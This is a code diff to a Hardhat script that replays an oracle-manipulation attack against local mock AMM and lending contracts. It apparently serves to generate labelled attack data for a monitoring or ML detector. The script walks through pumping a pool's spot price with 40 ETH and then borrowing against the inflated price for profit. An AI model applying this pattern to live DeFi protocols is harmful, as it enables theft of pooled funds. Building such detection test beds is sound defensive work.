@@ -1,5 +1,5 @@
 import { network } from "hardhat";
-import { banner, loadDeployment, saveDeployment, sleep, stillDeployed } from "./lib/common.js";
+import { banner, loadDeployment, saveDeployment, sleep, stillDeployed, topUp } from "./lib/common.js";
 
 /**
  * ORACLE-MANIPULATION replay (local, no mainnet needed).
@@ -23,6 +23,7 @@ async function main() {
 
   if (fresh) {
     banner("Deploying oracle scenario");
+    await topUp(ethers, [deployer, bob, attacker]);
     const Pool = await ethers.getContractFactory("MockAmmPool");
     const pool = await Pool.deploy();
     await pool.waitForDeployment();
@@ -52,16 +53,19 @@ async function main() {
     return Number(r0) / Number(r1);
   };
 
-  console.log("Normal swaps first (the monitor's baseline)...");
-  for (let i = 0; i < 6; i++) {
-    await (await pool.connect(bob).swapEthForTokens({ value: ethers.parseEther("0.5") })).wait();
-    console.log("  spot price:", (await price()).toFixed(4));
-    await sleep(700);
+  // WARMUP=0 skips the built-in normal swaps (the ML data collector runs benign-traffic.js separately).
+  if (process.env.WARMUP !== "0") {
+    console.log("Normal swaps first (the monitor's baseline)...");
+    for (let i = 0; i < 6; i++) {
+      await (await pool.connect(bob).swapEthForTokens({ value: ethers.parseEther("0.5") })).wait();
+      console.log("  spot price:", (await price()).toFixed(4));
+      await sleep(700);
+    }
   }
 
   const lenderBefore = await ethers.provider.getBalance(dep.lender);
   console.log("\nAttacker pumps the pool with 40 ETH...");
-  await (await pool.connect(attacker).swapEthForTokens({ value: ethers.parseEther("40") })).wait();
+  const pump = await (await pool.connect(attacker).swapEthForTokens({ value: ethers.parseEther("40") })).wait();
   console.log("  spot price:", (await price()).toFixed(4), "  <-- manipulated");
   await sleep(1500);
 
@@ -69,6 +73,7 @@ async function main() {
   const rc = await (await lender.connect(attacker).borrow(tokens)).wait();
   const ev = lender.interface.parseLog(rc.logs.find((l) => l.address === dep.lender));
   const out = ev.args[2];
+  console.log("ATTACK_BLOCKS", pump.blockNumber, rc.blockNumber);
   console.log(
     `Borrowed ${ethers.formatEther(out)} ETH against ${ethers.formatEther(tokens)} tokens ` +
       `(paid 40 ETH into the pool) -> net ${ethers.formatEther(out - ethers.parseEther("40"))} ETH`
